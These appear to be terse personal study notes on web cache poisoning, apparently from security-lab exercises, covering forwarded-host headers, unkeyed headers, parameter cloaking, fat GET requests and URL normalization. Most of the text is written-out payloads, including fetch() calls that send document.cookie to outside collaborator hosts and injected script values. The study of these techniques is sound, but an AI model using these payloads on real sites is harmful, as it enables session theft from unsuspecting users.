X-Forwarded-Host: evil.com
X-Forwarded-Scheme: nothttps
X-Host: evil.com
X-Forwarded-Server: evil.com
**Multiple headers
```
resources/js/tracking.js
alert(document.cookie)
/?test=123 miss
await..hit
```
fehost="-alert(1)-"
```
fehost="-fetch(`https://burp.oastify.com/?c=`+btoa(document.cookie))-"
```
**Unknown Header**
If find Vary:User-Agent
```inComment
<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />
<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/resources/js/tracking.js" />
To trigger fetch(burp) to get session
chang user-agent to same victim in /resources/js/tracking.js
```

**Unkeyed query string (Canonical)
![[Pasted image 20260609154119.png]]

**Parameter Cloaking
```
/js/geolocate.js?callback=setCountryCookie
```
![[Pasted image 20260609164448.png]]
```
&utm_content=foo;callback=fetch(`https://446weviy4d0m7wbst0g7wq3rpivaj47t.oastify.com/?c=${document.cookie}`)
```
**fat GET (Override callback Function)
![[Pasted image 20260609165851.png]]
```
callback=fetch(`https://b9l3j2n59k5tc3gzy7le1x8yup0hocc1.oastify.com/?${document.cookie}`)
```
**URL normalization
![[Pasted image 20260609171938.png]]

